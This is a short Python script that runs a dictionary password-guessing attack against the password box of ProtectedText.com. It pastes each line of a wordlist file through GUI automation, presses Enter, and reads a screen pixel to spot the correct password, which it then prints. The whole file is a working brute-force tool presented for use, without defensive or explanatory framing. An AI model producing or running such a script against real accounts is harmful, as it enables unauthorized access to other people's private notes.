import pyautogui
import time
import pyperclip
import os.path


wordlist_existing = os.path.exists("WordList.txt")
if wordlist_existing == True:
    pass
else:
    open('WordList.txt', 'w')
    input("Type your possible password in newly created file WordList.txt\nOne password per line\nWhen you are done save the file and press enter\n")
    pass


def countdown(t):
    while t:
        mins, secs = divmod(t, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print(timer, end="\r")
        time.sleep(1)
        t -= 1
    print("Starting\n\n")



wordlist = []

with open('WordList.txt', 'r') as f:
    wordlist = [line.strip() for line in f]

input("Press Enter and click the password box in ProtectedText.com\n")
countdown(int(10))
originalclip = pyperclip.paste()


for word in wordlist:
    pyperclip.copy(f"{word}")
    pyautogui.hotkey("ctrl", "v")
    pyautogui.hotkey("enter")
    time.sleep(0.3)
    if pyautogui.pixel(604, 502)[0] == 51:   #if it doesnt work , get position of the gray area with : pyautogui.displayMousePosition()
        print(f"Password {word} is Incorrect\n")
    else:
        pyperclip.copy(originalclip)
        print(f"Correct password: {word}")
        exit()



#t = input("Enter the time in seconds: ")
# function call
#countdown(int(t))
